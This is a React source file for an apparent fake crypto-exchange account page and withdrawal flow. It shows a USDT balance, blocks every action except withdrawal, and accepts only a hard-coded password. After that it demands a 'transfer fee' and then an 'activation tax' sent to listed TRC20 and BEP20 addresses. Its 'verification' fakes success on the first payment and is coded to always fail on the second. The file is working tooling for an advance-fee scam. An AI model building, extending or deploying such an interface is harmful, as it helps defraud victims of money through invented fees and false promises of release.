import React, { useState } from 'react';
import { 
  MessageCircle, 
  ChevronRight, 
  Home, 
  Headset, 
  LayoutGrid, 
  ClipboardList, 
  User,
  Users,
  FileText,
  Wallet,
  UserPlus,
  CreditCard,
  Settings,
  History,
  ChevronLeft,
  CheckCircle2
} from 'lucide-react';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'mine' | 'withdrawal'>('mine');
  const [toast, setToast] = useState<{ message: string, visible: boolean }>({ message: '', visible: false });
  const [blockedId, setBlockedId] = useState<string | null>(null);
  const [showPaymentModal, setShowPaymentModal] = useState(false);

  const showToast = (message: string) => {
    setToast({ message, visible: true });
    setTimeout(() => setToast({ message: '', visible: false }), 3000);
  };

  const handleBlockedAction = (id: string) => {
    setBlockedId(id);
    showToast('Sorry, this action is currently unavailable due to account liquidation. You can only withdraw your remaining balance, and the account will be permanently closed upon completion of the withdrawal.');
    setTimeout(() => setBlockedId(null), 2000);
  };

  if (currentPage === 'withdrawal') {
    return (
      <>
        <WithdrawalPage 
          onBack={() => setCurrentPage('mine')} 
          showToast={showToast} 
          onSuccess={() => setShowPaymentModal(true)}
        />
        {showPaymentModal && <PaymentModal onClose={() => setShowPaymentModal(false)} />}
      </>
    );
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA] flex flex-col font-sans max-w-[430px] mx-auto shadow-xl relative pb-20">
      {/* Toast Notification */}
      {toast.visible && (
        <div className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[100] bg-black/85 text-white px-6 py-4 rounded-xl text-sm text-center max-w-[85%] shadow-2xl animate-in fade-in zoom-in duration-300 backdrop-blur-sm border border-white/10 leading-relaxed">
          {toast.message}
        </div>
      )}
      {/* Header Section */}
      <div 
        className="pt-8 pb-10 px-5 text-white relative"
        style={{
          background: 'linear-gradient(to right, #9B4A4E, #7C4A50)'
        }}
      >
        {/* Top Right Icon */}
        <div className="absolute top-6 right-5 cursor-pointer" onClick={() => handleBlockedAction('msg')}>
          <div className="relative">
            <MessageCircle size={24} className="opacity-90" />
            {blockedId === 'msg' && <span className="absolute -top-1 -right-1 text-xs">🚫</span>}
          </div>
        </div>

        {/* User Info Row */}
        <div className="flex items-center gap-4 mb-6">
          <div className="w-16 h-16 bg-white rounded-full flex-shrink-0"></div>
          <div className="flex flex-col">
            <div className="flex items-center gap-2">
              <span className="text-xl font-bold">zuzu123</span>
              <span className="bg-[#F5B400] text-white text-[10px] px-1.5 py-0.5 rounded-[8px] font-bold italic">
                VIP 3
              </span>
            </div>
            <span className="text-sm opacity-80 mt-1">Invitation code: 024877</span>
          </div>
        </div>

        {/* Account Info Row */}
        <div className="flex justify-between items-end">
          <div className="flex flex-col">
            <span className="text-sm font-medium opacity-90 mb-2">My Account</span>
            <div className="flex items-baseline gap-2">
              <span className="text-sm font-bold">USDT</span>
              <span className="text-2xl font-bold tracking-tight">52078.5791</span>
            </div>
            <span className="text-[10px] opacity-70 mt-1 font-medium">خصم30 % = 36,455.00537 usdt</span>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-4">
            <div className="flex flex-col items-center gap-1 cursor-pointer" onClick={() => handleBlockedAction('deposit')}>
              <div className="w-12 h-12 bg-[#F5F5F5] rounded-[20px] flex items-center justify-center shadow-sm relative">
                <Wallet 
                  size={26} 
                  style={{ 
                    stroke: 'url(#blue-gradient)',
                    fill: 'url(#blue-gradient)'
                  }} 
                />
                {blockedId === 'deposit' && <span className="absolute inset-0 flex items-center justify-center text-xl bg-white/40 rounded-[20px]">🚫</span>}
              </div>
              <span className="text-[11px] font-medium opacity-90">Deposit</span>
            </div>
            <div 
              className="flex flex-col items-center gap-1 cursor-pointer"
              onClick={() => setCurrentPage('withdrawal')}
            >
              <div className="w-12 h-12 bg-[#F5F5F5] rounded-[20px] flex items-center justify-center shadow-sm">
                <CreditCard 
                  size={26} 
                  style={{ 
                    stroke: 'url(#blue-gradient)',
                    fill: 'url(#blue-gradient)'
                  }} 
                />
              </div>
              <span className="text-[11px] font-medium opacity-90">Withdrawal</span>
            </div>
          </div>
        </div>

        {/* SVG Gradient Definition for Icons */}
        <svg width="0" height="0" className="absolute">
          <defs>
            <linearGradient id="blue-gradient" x1="0%" y1="0%" x2="0%" y2="100%">
              <stop offset="0%" stopColor="#1F6AE1" />
              <stop offset="100%" stopColor="#0B4DB8" />
            </linearGradient>
          </defs>
        </svg>
      </div>

      {/* Feature Icons Row */}
      <div className="bg-white py-6 px-4 flex justify-between items-center border-b border-gray-100">
        <div className="flex flex-col items-center gap-2 flex-1 cursor-pointer" onClick={() => handleBlockedAction('teams')}>
          <div className="w-10 h-10 flex items-center justify-center relative">
            <Users size={28} className="text-[#F5B400]" />
            {blockedId === 'teams' && <span className="absolute inset-0 flex items-center justify-center text-xl bg-white/40">🚫</span>}
          </div>
          <span className="text-xs text-gray-600 font-medium">Teams</span>
        </div>
        <div className="flex flex-col items-center gap-2 flex-1 cursor-pointer" onClick={() => handleBlockedAction('record')}>
          <div className="w-10 h-10 flex items-center justify-center relative">
            <FileText size={28} className="text-[#4CAF50]" />
            {blockedId === 'record' && <span className="absolute inset-0 flex items-center justify-center text-xl bg-white/40">🚫</span>}
          </div>
          <span className="text-xs text-gray-600 font-medium">Record</span>
        </div>
        <div className="flex flex-col items-center gap-2 flex-1 cursor-pointer" onClick={() => handleBlockedAction('wallet_mgmt')}>
          <div className="w-10 h-10 flex items-center justify-center relative">
            <History size={28} className="text-[#F44336]" />
            {blockedId === 'wallet_mgmt' && <span className="absolute inset-0 flex items-center justify-center text-xl bg-white/40">🚫</span>}
          </div>
          <span className="text-xs text-gray-600 font-medium text-center leading-tight">Wallet management</span>
        </div>
        <div className="flex flex-col items-center gap-2 flex-1 cursor-pointer" onClick={() => handleBlockedAction('invite')}>
          <div className="w-10 h-10 flex items-center justify-center relative">
            <UserPlus size={28} className="text-[#2196F3]" />
            {blockedId === 'invite' && <span className="absolute inset-0 flex items-center justify-center text-xl bg-white/40">🚫</span>}
          </div>
          <span className="text-xs text-gray-600 font-medium">Invite friends</span>
        </div>
      </div>

      {/* Menu List Section */}
      <div className="mt-4 px-4">
        <div className="bg-white rounded-[16px] overflow-hidden shadow-sm">
          <MenuItem icon={<User size={20} className="text-gray-400" />} label="Profile" onClick={() => handleBlockedAction('profile')} blocked={blockedId === 'profile'} />
          <MenuItem icon={<ClipboardList size={20} className="text-gray-400" />} label="Deposit records" onClick={() => handleBlockedAction('dep_rec')} blocked={blockedId === 'dep_rec'} />
          <MenuItem icon={<History size={20} className="text-gray-400" />} label="Withdrawal records" onClick={() => handleBlockedAction('with_rec')} blocked={blockedId === 'with_rec'} />
          <MenuItem icon={<Settings size={20} className="text-gray-400" />} label="Setting" isLast onClick={() => handleBlockedAction('setting')} blocked={blockedId === 'setting'} />
        </div>
      </div>

      {/* Bottom Navigation Bar */}
      <div className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-white border-t border-gray-100 flex justify-around items-center py-2 px-2 z-50">
        <NavItem icon={<Home size={22} />} label="Home" onClick={() => handleBlockedAction('nav_home')} blocked={blockedId === 'nav_home'} />
        <NavItem icon={<Headset size={22} />} label="Service" onClick={() => handleBlockedAction('nav_service')} blocked={blockedId === 'nav_service'} />
        <NavItem icon={<LayoutGrid size={22} />} label="Menu" onClick={() => handleBlockedAction('nav_menu')} blocked={blockedId === 'nav_menu'} />
        <NavItem icon={<ClipboardList size={22} />} label="Record" onClick={() => handleBlockedAction('nav_record')} blocked={blockedId === 'nav_record'} />
        <NavItem icon={<User size={22} />} label="Mine" active />
      </div>
    </div>
  );
}

function WithdrawalPage({ onBack, showToast, onSuccess }: { onBack: () => void, showToast: (msg: string) => void, onSuccess: () => void }) {
  const [amount, setAmount] = useState('');
  const [password, setPassword] = useState('');
  const [toast, setToast] = useState<{ message: string, visible: boolean }>({ message: '', visible: false });
  const balance = 36455.00537;

  const internalShowToast = (message: string) => {
    setToast({ message, visible: true });
    setTimeout(() => setToast({ message: '', visible: false }), 3000);
  };

  const handleOk = () => {
    const numAmount = parseFloat(amount);
    
    if (!amount || isNaN(numAmount) || numAmount <= 0) {
      internalShowToast('Please enter a valid amount');
      return;
    }
    
    if (numAmount > balance) {
      internalShowToast('The entered amount is greater than your balance');
      return;
    }

    if (password !== '024877') {
      internalShowToast('The withdrawal password has been reset under the low-tax protocol.');
      return;
    }

    onSuccess();
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] flex flex-col font-sans max-w-[430px] mx-auto shadow-xl relative">
      {/* Toast Notification */}
      {toast.visible && (
        <div className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[100] bg-black/80 text-white px-6 py-3 rounded-lg text-sm text-center max-w-[80%] shadow-2xl animate-in fade-in zoom-in duration-300">
          {toast.message}
        </div>
      )}
      {/* Header */}
      <div className="bg-white h-14 flex items-center px-4 border-b border-gray-100 relative">
        <div className="cursor-pointer p-1" onClick={onBack}>
          <ChevronLeft size={24} className="text-gray-800" />
        </div>
        <h1 className="absolute left-1/2 -translate-x-1/2 text-lg font-bold text-gray-800">Withdrawal</h1>
      </div>

      {/* Currency Selection */}
      <div className="p-4 bg-white mt-1">
        <div className="relative w-24 h-24 border border-gray-200 rounded-lg flex flex-col items-center justify-center p-2">
          <div className="w-12 h-12 bg-[#2196F3] rounded-full flex items-center justify-center mb-1">
            <svg viewBox="0 0 24 24" className="w-10 h-10">
              <path d="M12 4L18 10L12 16L6 10L12 4Z" fill="white" />
              <path d="M14 6L20 12L14 18" stroke="white" strokeWidth="1.5" strokeLinecap="round" opacity="0.5" />
              <path d="M16 8L22 14L16 20" stroke="white" strokeWidth="1.5" strokeLinecap="round" opacity="0.3" />
              <text x="12" y="11.5" fontSize="6" fontWeight="bold" fill="#2196F3" textAnchor="middle" dominantBaseline="middle">B</text>
            </svg>
          </div>
          <span className="text-[10px] text-center font-bold text-gray-600 leading-tight">virtual currency</span>
          {/* Red Checkmark Badge */}
          <div className="absolute bottom-0 right-0 w-5 h-5 bg-red-600 flex items-center justify-center rounded-tl-lg rounded-br-lg">
            <CheckCircle2 size={12} className="text-white" />
          </div>
        </div>
      </div>

      {/* Wallet Section */}
      <div className="mt-4">
        <div className="px-4 py-3 text-sm font-bold text-gray-800 bg-white">Wallet</div>
        <div className="bg-white px-4 py-4 flex items-center justify-between border-t border-gray-50">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-[#2196F3] rounded-full flex items-center justify-center overflow-hidden">
              <svg viewBox="0 0 24 24" className="w-6 h-6">
                <path d="M12 4L18 10L12 16L6 10L12 4Z" fill="white" />
                <path d="M14 6L20 12L14 18" stroke="white" strokeWidth="1.5" strokeLinecap="round" opacity="0.5" />
                <path d="M16 8L22 14L16 20" stroke="white" strokeWidth="1.5" strokeLinecap="round" opacity="0.3" />
                <text x="12" y="11.5" fontSize="6" fontWeight="bold" fill="#2196F3" textAnchor="middle" dominantBaseline="middle">B</text>
              </svg>
            </div>
            <span className="text-sm font-bold text-gray-800">Binance(TRC-20)</span>
          </div>
          <div className="w-5 h-5 bg-red-600 rounded-full flex items-center justify-center">
            <CheckCircle2 size={14} className="text-white" />
          </div>
        </div>
      </div>

      {/* Amount Section */}
      <div className="mt-4 bg-white px-4 py-4 flex items-center gap-6">
        <span className="text-sm font-bold text-gray-800">USDT</span>
        <input 
          type="number"
          placeholder="Please enter the amount"
          className="flex-1 outline-none text-sm font-bold text-gray-800 placeholder:text-gray-300"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
        />
      </div>

      {/* Password Section */}
      <div className="mt-4 bg-white px-4 py-6">
        <div className="text-sm font-bold text-gray-800 mb-4">Withdrawal password</div>
        <input 
          type="password"
          placeholder="......"
          className="w-full outline-none text-lg font-bold text-gray-800 tracking-widest placeholder:text-gray-300"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
      </div>

      {/* OK Button */}
      <div className="mt-8 px-4">
        <button 
          className="w-full bg-[#6D4C52] text-white py-4 rounded-lg text-lg font-bold active:opacity-90 transition-opacity"
          onClick={handleOk}
        >
          OK
        </button>
      </div>
    </div>
  );
}

function MenuItem({ icon, label, isLast = false, onClick, blocked }: { icon: React.ReactNode, label: string, isLast?: boolean, onClick?: () => void, blocked?: boolean }) {
  return (
    <div 
      className={`flex items-center justify-between px-5 py-4 ${!isLast ? 'border-b border-gray-50' : ''} active:bg-gray-50 cursor-pointer transition-colors relative`}
      onClick={onClick}
    >
      <div className="flex items-center gap-4">
        <div className="relative">
          {icon}
          {blocked && <span className="absolute inset-0 flex items-center justify-center text-lg bg-white/40">🚫</span>}
        </div>
        <span className="text-[15px] text-gray-700 font-medium">{label}</span>
      </div>
      <ChevronRight size={18} className="text-gray-300" />
    </div>
  );
}

function NavItem({ icon, label, active = false, onClick, blocked }: { icon: React.ReactNode, label: string, active?: boolean, onClick?: () => void, blocked?: boolean }) {
  return (
    <div 
      className={`flex flex-col items-center gap-1 flex-1 cursor-pointer relative ${active ? 'text-gray-800' : 'text-gray-400'}`}
      onClick={onClick}
    >
      <div className="relative">
        {icon}
        {blocked && <span className="absolute inset-0 flex items-center justify-center text-lg bg-white/40">🚫</span>}
      </div>
      <span className="text-[10px] font-medium">{label}</span>
    </div>
  );
}

function PaymentModal({ onClose }: { onClose: () => void }) {
  const [stage, setStage] = useState<'transfer_fee' | 'inactivity_tax'>('transfer_fee');
  const [status, setStatus] = useState<'idle' | 'verifying' | 'success' | 'failed'>('idle');

  const handlePaid = () => {
    setStatus('verifying');
    setTimeout(() => {
      if (stage === 'transfer_fee') {
        setStatus('success');
      } else {
        setStatus('failed');
      }
    }, 10000);
  };

  const handleNext = () => {
    setStage('inactivity_tax');
    setStatus('idle');
  };

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center px-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300">
      <div className="bg-white w-full max-w-[380px] rounded-2xl overflow-hidden shadow-2xl animate-in zoom-in slide-in-from-bottom-4 duration-500">
        <div className="bg-[#6D4C52] p-5 text-center">
          <h2 className="text-white text-xl font-bold">
            {stage === 'transfer_fee' ? 'External Transfer Verification' : 'Account Activation Protocol'}
          </h2>
        </div>
        
        <div className="p-6 space-y-4">
          {status === 'verifying' ? (
            <div className="py-12 flex flex-col items-center justify-center space-y-4">
              <div className="w-12 h-12 border-4 border-[#6D4C52] border-t-transparent rounded-full animate-spin"></div>
              <p className="text-gray-600 font-medium text-center">Verifying payment status...<br/>Please do not close this window.</p>
            </div>
          ) : (
            <>
              <div className="text-gray-700 text-sm leading-relaxed space-y-3">
                {status === 'success' && (
                  <div className="bg-green-50 border border-green-100 p-3 rounded-lg text-green-700 text-xs font-medium flex items-start gap-2 animate-in slide-in-from-top-2 duration-300">
                    <span className="text-lg">✅</span>
                    <p>Transfer fee verification successful. Network synchronization initiated.</p>
                  </div>
                )}
                
                {status === 'failed' && (
                  <div className="bg-red-50 border border-red-100 p-3 rounded-lg text-red-600 text-xs font-medium flex items-start gap-2 animate-in slide-in-from-top-2 duration-300">
                    <span className="text-lg">⚠️</span>
                    <p>Verification failed. Please ensure you have settled the 122.16 USDT activation fee to proceed with the final release.</p>
                  </div>
                )}

                {status !== 'success' && (
                  <>
                    {stage === 'transfer_fee' ? (
                      <>
                        <p>
                          Your withdrawal request has been processed. However, due to the <strong>Account Liquidation Protocol</strong>, this transaction is being executed via <strong>External Distributed Computing</strong> outside the standard platform network.
                        </p>
                        <p>
                          To complete the final synchronization and release your assets to your external wallet, a one-time <strong>External Network Transfer Fee</strong> must be settled independently.
                        </p>
                        <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
                          <div className="flex justify-between items-center mb-2">
                            <span className="text-gray-500 font-medium">Required Fee:</span>
                            <span className="text-[#6D4C52] font-bold text-lg">187.42 USDT</span>
                          </div>
                        </div>
                      </>
                    ) : (
                      <>
                        <p className="font-bold text-[#6D4C52]">Final Step Required</p>
                        <p>
                          Our system has detected a prolonged period of <strong>Account Inactivity</strong>. According to the global security protocol, accounts that remain dormant for extended periods are automatically restricted to protect user assets.
                        </p>
                        <p>
                          To reactivate your account and finalize the 36,455.00 USDT transfer, an <strong>Account Negligence & Activation Tax</strong> is required. This ensures the integrity of the blockchain bridge and confirms the active ownership of the receiving wallet.
                        </p>
                        <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
                          <div className="flex justify-between items-center mb-2">
                            <span className="text-gray-500 font-medium">Activation Tax:</span>
                            <span className="text-[#6D4C52] font-bold text-lg">122.16 USDT</span>
                          </div>
                          <p className="text-[10px] text-gray-500 mt-2">
                            Rest assured, this is the final administrative requirement. Once confirmed, your full balance will be released immediately without further delay.
                          </p>
                        </div>
                      </>
                    )}
                  </>
                )}
              </div>

              {status !== 'success' && (
                <div className="space-y-3">
                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
                    <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">TRC20 Address</span>
                    <code className="text-[11px] break-all font-mono text-gray-700 select-all">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
                  </div>
                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
                    <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">BEP20 Address</span>
                    <code className="text-[11px] break-all font-mono text-gray-700 select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
                  </div>
                </div>
              )}

              <div className="flex gap-3">
                {status === 'success' ? (
                  <button 
                    onClick={handleNext}
                    className="w-full bg-[#6D4C52] text-white py-3.5 rounded-xl font-bold text-sm shadow-lg shadow-[#6D4C52]/20 active:scale-[0.98] transition-all"
                  >
                    Next Step
                  </button>
                ) : (
                  <>
                    <button 
                      onClick={onClose}
                      className="flex-1 bg-gray-100 text-gray-600 py-3.5 rounded-xl font-bold text-sm active:scale-[0.98] transition-all"
                    >
                      Not Now
                    </button>
                    <button 
                      onClick={handlePaid}
                      className="flex-[1.5] bg-[#6D4C52] text-white py-3.5 rounded-xl font-bold text-sm shadow-lg shadow-[#6D4C52]/20 active:scale-[0.98] transition-all"
                    >
                      I have paid, proceed
                    </button>
                  </>
                )}
              </div>
            </>
          )}
          
          <p className="text-center text-[10px] text-gray-400">
            Assets will be released automatically within 15-30 minutes after fee confirmation.
          </p>
        </div>
      </div>
    </div>
  );
}
